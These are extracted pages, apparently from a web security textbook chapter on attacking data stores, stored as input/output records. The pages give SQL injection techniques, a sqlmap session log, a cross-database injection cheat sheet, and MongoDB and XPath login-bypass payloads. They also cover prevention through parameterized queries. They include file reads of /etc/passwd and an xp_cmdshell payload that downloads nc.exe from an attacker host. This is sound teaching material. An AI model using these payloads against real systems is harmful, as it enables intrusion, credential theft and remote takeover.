    "output": "Stuttard c09.indd V3 - 07/28/2011 Page 328\n328 Chapter 9 n Attacking Data Stores\nMySQL\nCompared to the other databases covered, MySQL contains relatively little\nbuilt-in functionality that an attacker can misuse. One example is the ability\nof any user with the FILE_PRIV permission to read and write to the fi lesystem.\nThe LOAD_FILE command can be used to retrieve the contents of any fi le. For\nexample:\nselect load_file(‘/etc/passwd’)\nThe SELECT ... INTO OUTFILE command can be used to pipe the results of\nany query into a fi le. For example:\ncreate table test (a varchar(200))\ninsert into test(a) values (‘+ +’)\nselect * from test into outfile ‘/etc/hosts.equiv’\nIn addition to reading and writing key operating system fi les, this capability\ncan be used to perform other attacks:\nn Because MySQL stores its data in plaintext fi les, to which the database\nmust have read access, an attacker with FILE_PRIV permissions can simply\nopen the relevant fi le and read arbitrary data from within the database,\nbypassing any access controls enforced within the database itself.\nn MySQL enables users to create user-defi ned functions (UDFs) by calling\nout to a compiled library fi le that contains the function’s implementation.\nThis fi le must be located within the normal path from which MySQL loads\ndynamic libraries. An attacker can use the preceding method to create\nan arbitrary binary fi le within this path and then create a UDF that uses\nit. Refer to Chris Anley’s paper “Hackproofi ng MySQL” for more details\non this technique.\nUsing SQL Exploitation Tools\nMany of the techniques we have described for exploiting SQL injection vulner-\nabilities involve performing large numbers of requests to extract small amounts\nof data at a time. Fortunately, numerous tools are available that automate much\nof this process and that are aware of the database-specifi c syntax required to\ndeliver successful attacks.\nMost of the currently available tools use the following approach to exploit\nSQL injection vulnerabilities:\nn Brute-force all parameters in the target request to locate SQL injection\npoints.\ncc0099..iinndddd 332288 88//1199//22001111 1122::0099::3322 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 329\nChapter 9 n Attacking Data Stores 329\nn Determine the location of the vulnerable fi eld within the back-end SQL\nquery by appending various characters such as closing brackets, comment\ncharacters, and SQL keywords.\nn Attempt to perform a UNION attack by brute-forcing the number of required\ncolumns and then identifying a column with the varchar data type, which\ncan be used to return results.\nn Inject custom queries to retrieve arbitrary data — if necessary, concate-\nnating data from multiple columns into a string that can be retrieved\nthrough a single result of the varchar data type.\nn If results cannot be retrieved using UNION, inject Boolean conditions (AND\n1=1,AND 1=2, and so on) into the query to determine whether conditional\nresponses can be used to retrieve data.\nn If results cannot be retrieved by injecting conditional expressions, try\nusing conditional time delays to retrieve data.\nThese tools locate data by querying the relevant metadata tables for the data-\nbase in question. Generally they can perform some level of escalation, such as\nusing xp_cmdshell to gain OS-level access. They also use various optimization\ntechniques, making use of the many features and built-in functions in the various\ndatabases to decrease the number of necessary queries in an inference-based\nbrute-force attack, evade potential fi lters on single quotes, and more.\nNOTE These tools are primarily exploitation tools, best suited to extracting\ndata from the database by exploiting an injection point that you have already\nidentifi ed and understood. They are not a magic bullet for fi nding and exploit-\ning SQL injection fl aws. In practice, it is often necessary to provide some\nadditional SQL syntax before and/or after the data injected by the tool for the\ntool’s hard-coded attacks to work.\nHACK STEPS\nWhen you have identifi ed a SQL injection vulnerability, using the techniques\ndescribed earlier in this chapter, you can consider using a SQL injection tool to\nexploit the vulnerability and retrieve interesting data from the database. This\noption is particularly useful in cases where you need to use blind techniques\nto retrieve a small amount of data at a time.\n1. Run the SQL exploitation tool using an intercepting proxy. Analyze the\nrequests made by the tool as well as the application’s responses. Turn on\nany verbose output options on the tool, and correlate its progress with the\nobserved queries and responses.\nContinued\ncc0099..iinndddd 332299 88//1199//22001111 1122::0099::3322 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 330\n330 Chapter 9 n Attacking Data Stores\nHACK STEPS (CONTINUED)\n2. Because these kinds of tools rely on preset tests and specific response\nsyntax, it may be necessary to append or prepend data to the string\ninjected by the tool to ensure that the tool gets the expected response.\nTypical requirements are adding a comment character, balancing the\nsingle quotes within the server’s SQL query, and appending or prepending\nclosing brackets to the string to match the original query.\n3. If the syntax appears to be failing regardless of the methods described\nhere, it is often easiest to create a nested subquery that is fully under\nyour control, and allow the tool to inject into that. This allows the tool to\nuse inference to extract data. Nested queries work well when you inject\ninto standard SELECT and UPDATE queries. Under Oracle they work within\nanINSERT statement. In each of the following cases, prepend the text\noccurring before [input], and append the closing bracket occurring after\nthat point:\nn Oracle: ‘||(select 1 from dual where 1=[input])\nn MS-SQL: (select 1 where 1=[input])\nNumerous tools exist for automated exploitation of SQL injection. Many of\nthese are specifi cally geared toward MS-SQL, and many have ceased active\ndevelopment and have been overtaken by new techniques and developments in\nSQL injection. The authors’ favorite is sqlmap, which can attack MySQL, Oracle,\nand MS-SQL, among others. It implements UNION-based and inference-based\nretrieval. It supports various escalation methods, including retrieval of fi les\nfrom the operating system, and command execution under Windows using\nxp_cmdshell.\nIn practice, sqlmap is an effective tool for database information retrieval\nthrough time-delay or other inference methods and can be useful for UNION-\nbased retrieval. One of the best ways to use it is with the --sql-shell option.\nThis gives the attacker a SQL prompt and performs the necessary UNION, error-\nbased, or blind SQL injection behind the scenes to send and retrieve results.\nFor example:\nC:\\sqlmap>sqlmap.py -u http://wahh-app.com/employees?Empno=7369 --union-use\n--sql-shell -p Empno\nsqlmap/0.8 - automatic SQL injection and database takeover tool\nhttp://sqlmap.sourceforge.net\n[*] starting at: 14:54:39\n[14:54:39] [INFO] using ‘C:\\sqlmap\\output\\wahh-app.com\\session’\nas session file\n[14:54:39] [INFO] testing connection to the target url\n[14:54:40] [WARNING] the testable parameter ‘Empno’ you provided is not\ncc0099..iinndddd 333300 88//1199//22001111 1122::0099::3322 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 331\nChapter 9 n Attacking Data Stores 331\ninto the\nCookie\n[14:54:40] [INFO] testing if the url is stable, wait a few seconds\n[14:54:44] [INFO] url is stable\n[14:54:44] [INFO] testing sql injection on GET parameter ‘Empno’ with 0\nparenthesis\n[14:54:44] [INFO] testing unescaped numeric injection on GET parameter\n‘Empno’\n[14:54:46] [INFO] confirming unescaped numeric injection on GET\nparameter ‘Empno’\n[14:54:47] [INFO] GET parameter ‘Empno’ is unescaped numeric injectable\nwith 0\nparenthesis\n[14:54:47] [INFO] testing for parenthesis on injectable parameter\n[14:54:50] [INFO] the injectable parameter requires 0 parenthesis\n[14:54:50] [INFO] testing MySQL\n[14:54:51] [WARNING] the back-end DMBS is not MySQL\n[14:54:51] [INFO] testing Oracle\n[14:54:52] [INFO] confirming Oracle\n[14:54:53] [INFO] the back-end DBMS is Oracle\nweb server operating system: Windows 2000\nweb application technology: ASP, Microsoft IIS 5.0\nback-end DBMS: Oracle\n[14:54:53] [INFO] testing inband sql injection on parameter ‘Empno’ with\nNULL\nbruteforcing technique\n[14:54:58] [INFO] confirming full inband sql injection on parameter\n‘Empno’\n[14:55:00] [INFO] the target url is affected by an exploitable full\ninband\nsql injection vulnerability\nvalid union: ‘http://wahh-app.com:80/employees.asp?Empno=7369%20\nUNION%20ALL%20SEL\nECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%20FROM%20DUAL--%20AND%20\n3663=3663’\n[14:55:00] [INFO] calling Oracle shell. To quit type ‘x’ or ‘q’ and\npress ENTER\nsql-shell> select banner from v$version\ndo you want to retrieve the SQL statement output? [Y/n]\n[14:55:19] [INFO] fetching SQL SELECT statement query output: ‘select banner\nfrom v$version’\nselect banner from v$version [5]:\n[*] CORE 9.2.0.1.0 Production\n[*] NLSRTL Version 9.2.0.1.0 - Production\n[*] Oracle9i Enterprise Edition Release 9.2.0.1.0 - Production\n[*] PL/SQL Release 9.2.0.1.0 - Production\n[*] TNS for 32-bit Windows: Version 9.2.0.1.0 - Production\nsql-shell>\ncc0099..iinndddd 333311 88//1199//22001111 1122::0099::3322 PPMM"
  },
  {
    "input": "SQL Syntax and Error Reference",
    "output": "Stuttard c09.indd V3 - 07/28/2011 Page 332\n332 Chapter 9 n Attacking Data Stores\nSQL Syntax and Error Reference\nWe have described numerous techniques that enable you to probe for and\nexploit SQL injection vulnerabilities in web applications. In many cases, there\nare minor differences between the syntax that you need to employ against\ndifferent back-end database platforms. Furthermore, every database produces\ndifferent error messages whose meaning you need to understand both when\nprobing for fl aws and when attempting to craft an effective exploit. The fol-\nlowing pages contain a brief cheat sheet that you can use to look up the exact\nsyntax you need for a particular task and to decipher any unfamiliar error\nmessages you encounter.\nSQL Syntax\nRequirement: ASCII and SUBSTRING\nOracle: ASCII(‘A’) is equal to 65\nSUBSTR(‘ABCDE’,2,3) is equal to BCD\nMS-SQL: ASCII(‘A’) is equal to 65\nSUBSTRING(‘ABCDE’,2,3) is equal to BCD\nMySQL: ASCII(‘A’) is equal to 65\nSUBSTRING(‘ABCDE’,2,3) is equal to BCD\nRequirement: Retrieve current database user\nOracle: Select Sys.login_user from dual SELECT\nuser FROM dual SYS_CONTEXT(‘USERENV’,\n‘SESSION_USER’)\nMS-SQL: select suser_sname()\nMySQL: SELECT user()\nRequirement: Cause a time delay\nOracle: Utl_Http.request(‘http://madeupserver.com’)\nMS-SQL: waitfor delay ‘0:0:10’\nexec master..xp_cmdshell ‘ping localhost’\nMySQL: sleep(100)\ncc0099..iinndddd 333322 88//1199//22001111 1122::0099::3333 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 333\nChapter 9 n Attacking Data Stores 333\nRequirement: Retrieve database version string\nOracle: select banner from v$version\nMS-SQL: select @@version\nMySQL: select @@version\nRequirement: Retrieve current database\nOracle: SELECT SYS_CONTEXT(‘USERENV’,’DB_NAME’) FROM dual\nMS-SQL: SELECT db_name()\nThe server name can be retrieved using:\nSELECT @@servername\nMySQL: SELECT database()\nRequirement: Retrieve current user’s privilege\nOracle: SELECT privilege FROM session_privs\nMS-SQL: SELECT grantee, table_name, privilege_type FROM\nINFORMATION_SCHEMA.TABLE_PRIVILEGES\nMySQL: S ELECT * FROM information_schema.user_privileges\nWHERE grantee = ‘[user]’ where [user] is determined\nfrom the output of SELECT user()\nRequirement: Show all tables and columns in a single column of results\nOracle: Select table_name||’\n‘||column_name from all_tab_columns\nMS-SQL: SELECT table_name+’\n‘+column_name from information_schema.columns\nMySQL: SELECT CONCAT(table_name,\n‘,column_name) from information_schema.columns\nRequirement: Show user objects\nOracle: SELECT object_name, object_type FROM user_objects\nMS-SQL: SELECT name FROM sysobjects\nMySQL: S ELECT table_name FROM information_schema.tables\n(or trigger_name from information_schema.triggers, etc.)\nContinued\ncc0099..iinndddd 333333 88//1199//22001111 1122::0099::3333 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 334\n334 Chapter 9 n Attacking Data Stores\n(continued)\nRequirement: Show user tables\nOracle: SELECT object_name, object_type FROM user_objects\nWHERE object_type=’TABLE’\nOr to show all tables to which the user has access:\nSELECT table_name FROM all_tables\nMS-SQL: SELECT name FROM sysobjects WHERE xtype=’U’\nMySQL: SELECT table_name FROM information_schema.\ntables where table_type=’BASE TABLE’ and\ntable_schema!=’mysql’\nRequirement: Show column names for table foo\nOracle: SELECT column_name, name FROM user_tab_columns\nWHERE table_name = ‘FOO’\nUse the ALL_tab_columns table if the target data is not owned\nby the current application user.\nMS-SQL: SELECT column_name FROM information_schema.columns\nWHERE table_name=’foo’\nMySQL: SELECT column_name FROM information_schema.columns\nWHERE table_name=’foo’\nRequirement: Interact with the operating system (simplest ways)\nOracle: See TheOracleHacker’sHandbook by David Litchfi eld\nMS-SQL: EXEC xp_cmshell ‘dir c:\\ ‘\nMySQL: SELECT load_file(‘/etc/passwd’)\nSQL Error Messages\nOracle: ORA-01756: quoted string not properly terminated\nORA-00933: SQL command not properly ended\nMS-SQL: Msg 170, Level 15, State 1, Line 1\nLine 1: Incorrect syntax near ‘foo’\nMsg 105, Level 15, State 1, Line 1\nUnclosed quotation mark before the character string\n‘foo’\ncc0099..iinndddd 333344 88//1199//22001111 1122::0099::3333 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 335\nChapter 9 n Attacking Data Stores 335\nMySQL: You have an error in your SQL syntax. Check the man-\nual that corresponds to your MySQL server version\nfor the right syntax to use near ‘’foo’ at line X\nTranslation: For Oracle and MS-SQL, SQL injection is present, and it is almost\ncertainly exploitable! If you entered a single quote and it altered\nthe syntax of the database query, this is the error you’d expect. For\nMySQL, SQL injection may be present, but the same error message\ncan appear in other contexts.\nOracle: PLS-00306: wrong number or types of arguments in\ncall to ‘XXX’\nMS-SQL: Procedure ‘XXX’ expects parameter ‘@YYY’, which was\nnot supplied\nMySQL: N/A\nTranslation: You have commented out or removed a variable that normally would\nbe supplied to the database. In MS-SQL, you should be able to use\ntime delay techniques to perform arbitrary data retrieval.\nOracle: ORA-01789: query block has incorrect number of\nresult columns\nMS-SQL: Msg 205, Level 16, State 1, Line 1\nAll queries in a SQL statement containing a UNION\noperator must have an equal number of expressions in\ntheir target lists.\nMySQL: The used SELECT statements have a different number\nof columns\nTranslation: You will see this when you are attempting a UNION SELECT attack,\nand you have specifi ed a different number of columns to the number\nin the original SELECT statement.\nOracle: ORA-01790: expression must have same datatype as\ncorresponding expression\nMS-SQL: Msg 245, Level 16, State 1, Line 1\nSyntax error converting the varchar value ‘foo’ to a\ncolumn of data type int.\nMySQL: (MySQL will not give you an error.)\nTranslation: You will see this when you are attempting a UNION SELECT attack,\nand you have specifi ed a different data type from that found in the\noriginal SELECT statement. Try using a NULL, or using 1 or 2000.\nContinued\ncc0099..iinndddd 333355 88//1199//22001111 1122::0099::3333 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 336\n336 Chapter 9 n Attacking Data Stores\n(continued)\nOracle: ORA-01722: invalid number\nORA-01858: a non-numeric character was found where a\nnumeric was expected\nMS-SQL: Msg 245, Level 16, State 1, Line 1\nSyntax error converting the varchar value ‘foo’ to a\ncolumn of data type int.\nMySQL: (MySQL will not give you an error.)\nTranslation: Your input doesn’t match the expected data type for the fi eld. You\nmay have SQL injection, and you may not need a single quote, so\ntry simply entering a number followed by your SQL to be injected. In\nMS-SQL, you should be able to return any string value with this error\nmessage.\nOracle: ORA-00923: FROM keyword not found where expected\nMS-SQL: N/A\nMySQL: N/A\nTranslation: The following will work in MS-SQL:\nSELECT 1\nBut in Oracle, if you want to return something, you must select from\na table. The DUAL table will do fi ne:\nSELECT 1 from DUAL\nOracle: ORA-00936: missing expression\nMS-SQL: Msg 156, Level 15, State 1, Line 1Incorrect syntax\nnear the keyword ‘from’.\nMySQL: You have an error in your SQL syntax. Check the\nmanual that corresponds to your MySQL server version\nfor the right syntax to use near ‘ XXX , YYY from\nSOME_TABLE’ at line 1\nTranslation: You commonly see this error message when your injection point\noccurs before the FROM keyword (for example, you have injected\ninto the columns to be returned) and/or you have used the com-\nment character to remove required SQL keywords. Try completing the\nSQL statement yourself while using your comment character. MySQL\nshould helpfully reveal the column names XXX, YYY when this condi-\ntion is encountered.\ncc0099..iinndddd 333366 88//1199//22001111 1122::0099::3333 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 337\nChapter 9 n Attacking Data Stores 337\nOracle: ORA-00972:identifier is too long\nMS-SQL: String or binary data would be truncated.\nMySQL: N/A\nTranslation: This does not indicate SQL injection. You may see this error message\nif you have entered a long string. You’re unlikely to get a buffer over-\nfl ow here either, because the database is handling your input safely.\nOracle: ORA-00942: table or view does not exist\nMS-SQL: Msg 208, Level 16, State 1, Line 1\nInvalid object name ‘foo’\nMySQL: Table ‘DBNAME.SOMETABLE’ doesn’t exist\nTranslation: Either you are trying to access a table or view that does not exist, or,\nin the case of Oracle, the database user does not have privileges for\nthe table or view. Test your query against a table you know you have\naccess to, such as DUAL. MySQL should helpfully reveal the current\ndatabase schema DBNAME when this condition is encountered.\nOracle: ORA-00920: invalid relational operator\nMS-SQL: Msg 170, Level 15, State 1, Line 1\nLine 1: Incorrect syntax near foo\nMySQL: You have an error in your SQL syntax. Check the\nmanual that corresponds to your MySQL server version\nfor the right syntax to use near ‘’ at line 1\nTranslation: You were probably altering something in a WHERE clause, and your\nSQL injection attempt has disrupted the grammar.\nOracle: ORA-00907: missing right parenthesis\nMS-SQL: N/A\nMySQL: You have an error in your SQL syntax. Check the\nmanual that corresponds to your MySQL server version\nfor the right syntax to use near ‘’ at line 1\nTranslation: Your SQL injection attempt has worked, but the injection point was\ninside parentheses. You probably commented out the closing paren-\nthesis with injected comment characters (--).\nContinued\ncc0099..iinndddd 333377 88//1199//22001111 1122::0099::3333 PPMM"
  },
  {
    "input": "Preventing SQL Injection",
    "output": "Stuttard c09.indd V3 - 07/28/2011 Page 338\n338 Chapter 9 n Attacking Data Stores\n(continued)\nOracle: ORA-00900: invalid SQL statement\nMS-SQL: Msg 170, Level 15, State 1, Line 1\nLine 1: Incorrect syntax near foo\nMySQL: You have an error in your SQL syntax. Check the\nmanual that corresponds to your MySQL server version\nfor the right syntax to use near XXXXXX\nTranslation: A general error message. The error messages listed previously all take\nprecedence, so something else went wrong. It’s likely you can try\nalternative input and get a more meaningful message.\nOracle: ORA-03001: unimplemented feature\nMS-SQL: N/A\nMySQL: N/A\nTranslation: You have tried to perform an action that Oracle does not allow. This\ncan happen if you were trying to display the database version string\nfrom v$version but you were in an UPDATE or INSERT query.\nOracle: ORA-02030: can only select from fixed tables/views\nMS-SQL: N/A\nMySQL: N/A\nTranslation: You were probably trying to edit a SYSTEM view. This can hap-\npen if you were trying to display the database version string from\nv$version but you were in an UPDATE or INSERT query.\nPreventing SQL Injection\nDespite all its different manifestations, and the complexities that can arise in its\nexploitation, SQL injection is in general one of the easier vulnerabilities to prevent.\nNevertheless, discussion about SQL injection countermeasures is frequently mislead-\ning, and many people rely on defensive measures that are only partially effective.\nPartially Effective Measures\nBecause of the prominence of the single quotation mark in the standard expla-\nnations of SQL injection fl aws, a common approach to preventing attacks is to\nescape any single quotation marks within user input by doubling them. You\nhave already seen two situations in which this approach fails:\nn If numeric user-supplied data is being embedded into SQL queries, this\nis not usually encapsulated within single quotation marks. Hence, an\ncc0099..iinndddd 333388 88//1199//22001111 1122::0099::3333 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 339\nChapter 9 n Attacking Data Stores 339\nattacker can break out of the data context and begin entering arbitrary\nSQL without the need to supply a single quotation mark.\nn In second-order SQL injection attacks, data that has been safely escaped\nwhen initially inserted into the database is subsequently read from the\ndatabase and then passed back to it again. Quotation marks that were\ndoubled initially return to their original form when the data is reused.\nAnother countermeasure that is often cited is the use of stored procedures\nfor all database access. There is no doubt that custom stored procedures can\nprovide security and performance benefi ts. However, they are not guaranteed\nto prevent SQL injection vulnerabilities for two reasons:\nn As you saw in the case of Oracle, a poorly written stored procedure can\ncontain SQL injection vulnerabilities within its own code. Similar security\nissues arise when constructing SQL statements within stored procedures\nas arise elsewhere. The fact that a stored procedure is being used does\nnot prevent fl aws from occurring.\nn Even if a robust stored procedure is being used, SQL injection vulnerabili-\nties can arise if it is invoked in an unsafe way using user-supplied input.\nFor example, suppose that a user registration function is implemented\nwithin a stored procedure, which is invoked as follows:\nexec sp_RegisterUser ‘joe’, ‘secret’\nThis statement may be just as vulnerable as a simple INSERT statement.\nFor example, an attacker may supply the following password:\nfoo’; exec master..xp_cmdshell ‘tftp wahh-attacker.com GET nc.exe’--\nwhich causes the application to perform the following batch query:\nexec sp_RegisterUser ‘joe’, ‘foo’; exec master..xp_cmdshell ‘tftp\nwahh-attacker.com GET nc.exe’--’\nTherefore, the use of the stored procedure has achieved nothing.\nIn fact, in a large and complex application that performs thousands of different\nSQL statements, many developers regard the solution of reimplementing these state-\nments as stored procedures to be an unjustifi able overhead on development time.\nParameterized Queries\nMost databases and application development platforms provide APIs for handling\nuntrusted input in a secure way, which prevents SQL injection vulnerabilities\nfrom arising. In parameterized queries (also known as preparedstatements), the\nconstruction of a SQL statement containing user input is performed in two steps:\n1. The application specifi es the query’s structure, leaving placeholders for\neach item of user input.\n2. The application specifi es the contents of each placeholder.\ncc0099..iinndddd 333399 88//1199//22001111 1122::0099::3333 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 340\n340 Chapter 9 n Attacking Data Stores\nCrucially, there is no way in which crafted data that is specifi ed at the\nsecond step can interfere with the structure of the query specifi ed in the fi rst\nstep. Because the query structure has already been defi ned, the relevant API\nhandles any type of placeholder data in a safe manner, so it is always interpreted\nas data rather than part of the statement’s structure.\nThe following two code samples illustrate the difference between an unsafe\nquery dynamically constructed from user data and its safe parameterized coun-\nterpart. In the fi rst, the user-supplied name parameter is embedded directly into\na SQL statement, leaving the application vulnerable to SQL injection:\n//define the query structure\nString queryText = “select ename,sal from emp where ename =’”;\n//concatenate the user-supplied name\nqueryText += request.getParameter(“name”);\nqueryText += “’”;\n// execute the query\nstmt = con.createStatement();\nrs = stmt.executeQuery(queryText);\nIn the second example, the query structure is defi ned using a question mark as\na placeholder for the user-supplied parameter. The prepareStatement method is\ninvoked to interpret this and fi x the structure of the query that is to be executed.\nOnly then is the setString method used to specify the parameter’s actual value.\nBecause the query’s structure has already been fi xed, this value can contain any\ndata without affecting the structure. The query is then executed safely:\n//define the query structure\nString queryText = “SELECT ename,sal FROM EMP WHERE ename = ?”;\n//prepare the statement through DB connection “con”\nstmt = con.prepareStatement(queryText);\n//add the user input to variable 1 (at the first ? placeholder)\nstmt.setString(1, request.getParameter(“name”));\n// execute the query\nrs = stmt.executeQuery();\nNOTE The precise methods and syntax for creating parameterized queries dif-\nfer among databases and application development platforms. See Chapter 18\nfor more details about the most common examples.\ncc0099..iinndddd 334400 88//1199//22001111 1122::0099::3333 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 341\nChapter 9 n Attacking Data Stores 341\nIf parameterized queries are to be an effective solution against SQL injection,\nyou need to keep in mind several important provisos:\nn They should be used for every database query. The authors have encoun-\ntered many applications where the developers made a judgment in each\ncase about whether to use a parameterized query. In cases where user-\nsupplied input was clearly being used, they did so; otherwise, they didn’t\nbother. This approach has been the cause of many SQL injection fl aws.\nFirst, by focusing only on input that has been immediately received from\nthe user, it is easy to overlook second-order attacks, because data that\nhas already been processed is assumed to be trusted. Second, it is easy to\nmake mistakes about the specifi c cases in which the data being handled\nis user-controllable. In a large application, different items of data are\nheld within the session or received from the client. Assumptions made\nby one developer may not be communicated to others. The handling of\nspecifi c data items may change in the future, introducing a SQL injection\nfl aw into previously safe queries. It is much safer to take the approach of\nmandating the use of parameterized queries throughout the application.\nn Every item of data inserted into the query should be properly para meterized.\nThe authors have encountered numerous cases where most of a query’s\nparameters are handled safely, but one or two items are concatenated\ndirectly into the string used to specify the query structure. The use of\nparameterized queries will not prevent SQL injection if some parameters\nare handled in this way.\nn Parameter placeholders cannot be used to specify the table and column\nnames used in the query. In some rare cases, applications need to specify\nthese items within a SQL query on the basis of user-supplied data. In this\nsituation, the best approach is to use a white list of known good values\n(the list of tables and columns actually used within the database) and to\nreject any input that does not match an item on this list. Failing this, strict\nvalidation should be enforced on the user input — for example, allow-\ning only alphanumeric characters, excluding whitespace, and enforcing\na suitable length limit.\nn Parameter placeholders cannot be used for any other parts of the query,\nsuch as the ASC or DESC keywords that appear within an ORDER BY clause,\nor any other SQL keyword, since these form part of the query structure.\nAs with table and column names, if it is necessary for these items to be\nspecifi ed based on user-supplied data, rigorous white list validation should\nbe applied to prevent attacks.\ncc0099..iinndddd 334411 88//1199//22001111 1122::0099::3333 PPMM"
  },
  {
    "input": "Injecting into NoSQL",
    "output": "Stuttard c09.indd V3 - 07/28/2011 Page 342\n342 Chapter 9 n Attacking Data Stores\nDefense in Depth\nAs always, a robust approach to security should employ defense-in-depth\nmeasures to provide additional protection in the event that frontline defenses\nfail for any reason. In the context of attacks against back-end databases, three\nlayers of further defense can be employed:\nn The application should use the lowest possible level of privileges when\naccessing the database. In general, the application does not need DBA-\nlevel permissions. It usually only needs to read and write its own data. In\nsecurity-critical situations, the application may employ a different database\naccount for performing different actions. For example, if 90 percent of its\ndatabase queries require only read access, these can be performed using\nan account that does not have write privileges. If a particular query needs\nto read only a subset of data (for example, the orders table but not the\nuser accounts table), an account with the corresponding level of access\ncan be used. If this approach is enforced throughout the application, any\nresidual SQL injection fl aws that may exist are likely to have their impact\nsignifi cantly reduced.\nn Many enterprise databases include a huge amount of default functional-\nity that can be leveraged by an attacker who gains the ability to execute\narbitrary SQL statements. Wherever possible, unnecessary functions\nshould be removed or disabled. Even though there are cases where a\nskilled and determined attacker may be able to recreate some required\nfunctions through other means, this task is not usually straightforward,\nand the database hardening will still place signifi cant obstacles in the\nattacker’s path.\nn All vendor-issued security patches should be evaluated, tested, and applied\nin a timely way to fi x known vulnerabilities within the database software\nitself. In security-critical situations, database administrators can use various\nsubscriber-based services to obtain advance notifi cation of some known\nvulnerabilities that have not yet been patched by the vendor. They can\nimplement appropriate work-around measures in the interim.\nInjecting into NoSQL\nThe term NoSQL is used to refer to various data stores that break from stan-\ndard relational database architectures. NoSQL data stores represent data using\nkey/value mappings and do not rely on a fi xed schema such as a conventional\ndatabase table. Keys and values can be arbitrarily defi ned, and the format of\nthe value generally is not relevant to the data store. A further feature of key/\nvalue storage is that a value may be a data structure itself, allowing hierarchical\nstorage, unlike the fl at data structure inside a database schema.\ncc0099..iinndddd 334422 88//1199//22001111 1122::0099::3333 PPMM"
  },
  {
    "input": "Injecting into MongoDB",
    "output": "Stuttard c09.indd V3 - 07/28/2011 Page 343\nChapter 9 n Attacking Data Stores 343\nNoSQL advocates claim this has several advantages, mainly in handling very\nlarge data sets, where the data store’s hierarchical structure can be optimized\nexactly as required to reduce the overhead in retrieving data sets. In these\ninstances a conventional database may require complex cross-referencing of\ntables to retrieve information on behalf of an application.\nFrom a web application security perspective, the key consideration is how\nthe application queries data, because this determines what forms of injection\nare possible. In the case of SQL injection, the SQL language is broadly similar\nacross different database products. NoSQL, by contrast, is a name given to a\ndisparate range of data stores, all with their own behaviors. They don’t all use\na single query language.\nHere are some of the common query methods used by NoSQL data stores:\nn Key/value lookup\nn XPath (described later in this chapter)\nn Programming languages such as JavaScript\nNoSQL is a relatively new technology that has evolved rapidly. It has not\nbeen deployed on anything like the scale of more mature technologies such as\nSQL. Hence, research into NoSQL-related vulnerabilities is still in its infancy.\nFurthermore, due to the inherently simple means by which many NoSQL imple-\nmentations allow access to data, examples sometimes discussed of injecting into\nNoSQL data stores can appear contrived.\nIt is almost certain that exploitable vulnerabilities will arise in how NoSQL\ndata stores are used in today’s and tomorrow’s web applications. One such\nexample, derived from a real-world application, is described in the next section.\nInjecting into MongoDB\nMany NoSQL databases make use of existing programming languages to pro-\nvide a fl exible, programmable query mechanism. If queries are built using\nstring concatenation, an attacker can attempt to break out of the data context\nand alter the query’s syntax. Consider the following example, which performs\na login based on user records in a MongoDB data store:\n$m = new Mongo();\n$db = $m->cmsdb;\n$collection = $db->user;\n$js = “function() {\nreturn this.username == ‘$username’ & this.password == ‘$password’; }”;\n$obj = $collection->findOne(array(‘$where’ => $js));\nif (isset($obj[“uid”]))\n{\n$logged_in=1;\ncc0099..iinndddd 334433 88//1199//22001111 1122::0099::3333 PPMM"
  },
  {
    "input": "Injecting into XPath",
    "output": "Stuttard c09.indd V3 - 07/28/2011 Page 344\n344 Chapter 9 n Attacking Data Stores\n}\nelse\n{\n$logged_in=0;\n}\n$js is a JavaScript function, the code for which is constructed dynamically\nand includes the user-supplied username and password. An attacker can bypass\nthe authentication logic by supplying a username:\nMarcus’//\nand any password. The resulting JavaScript function looks like this:\nfunction() { return this.username == ‘Marcus’//’ & this.password == ‘aaa’; }\nNOTE In JavaScript, a double forward slash (//) signifi es a rest-of-line com-\nment, so the remaining code in the function is commented out.\nAn alternative means of ensuring that the $js function always returns\ntrue, without using a comment, would be to supply a username of:\na’ || 1==1 || ‘a’==’a\nJavaScript interprets the various operators like this:\n(this.username == ‘a’ || 1==1) || (‘a’==’a’ & this.password ==\n‘aaa’);\nThis results in all of the resources in the user collection being matched,\nsince the fi rst disjunctive condition is always true (1 is always equal to 1).\nInjecting into XPath\nThe XML Path Language (XPath) is an interpreted language used to navigate\naround XML documents and to retrieve data from within them. In most cases,\nan XPath expression represents a sequence of steps that is required to navigate\nfrom one node of a document to another.\nWhere web applications store data within XML documents, they may use\nXPath to access the data in response to user-supplied input. If this input is\ninserted into the XPath query without any fi ltering or sanitization, an attacker\nmay be able to manipulate the query to interfere with the application’s logic or\nretrieve data for which she is not authorized.\nXML documents generally are not a preferred vehicle for storing enterprise data.\nHowever, they are frequently used to store application confi guration data that may\nbe retrieved on the basis of user input. They may also be used by smaller applica-\ntions to persist simple information such as user credentials, roles, and privileges.\ncc0099..iinndddd 334444 88//1199//22001111 1122::0099::3344 PPMM"
  },
  {
    "input": "Subverting Application Logic",
    "output": "Stuttard c09.indd V3 - 07/28/2011 Page 345\nChapter 9 n Attacking Data Stores 345\nConsider the following XML data store:\n<addressBook>\n<address>\n<firstName>William</firstName>\n<surname>Gates</surname>\n<password>MSRocks!</password>\n<email>billyg@microsoft.com</email>\n<ccard>5130 8190 3282 3515</ccard>\n</address>\n<address>\n<firstName>Chris</firstName>\n<surname>Dawes</surname>\n<password>secret</password>\n<email>cdawes@craftnet.de</email>\n<ccard>3981 2491 3242 3121</ccard>\n</address>\n<address>\n<firstName>James</firstName>\n<surname>Hunter</surname>\n<password>letmein</password>\n<email>james.hunter@pookmail.com</email>\n<ccard>8113 5320 8014 3313</ccard>\n</address>\n</addressBook>\nAn XPath query to retrieve all e-mail addresses would look like this:\n//address/email/text()\nA query to return all the details of the user Dawes would look like this:\n//address[surname/text()=’Dawes’]\nIn some applications, user-supplied data may be embedded directly into\nXPath queries, and the results of the query may be returned in the application’s\nresponse or used to determine some aspect of the application’s behavior.\nSubverting Application Logic\nConsider an application function that retrieves a user’s stored credit card num-\nber based on a username and password. The following XPath query effectively\nverifi es the user-supplied credentials and retrieves the relevant user’s credit\ncard number:\n//address[surname/text()=’Dawes’ and password/text()=’secret’]/ccard/\ntext()\ncc0099..iinndddd 334455 88//1199//22001111 1122::0099::3344 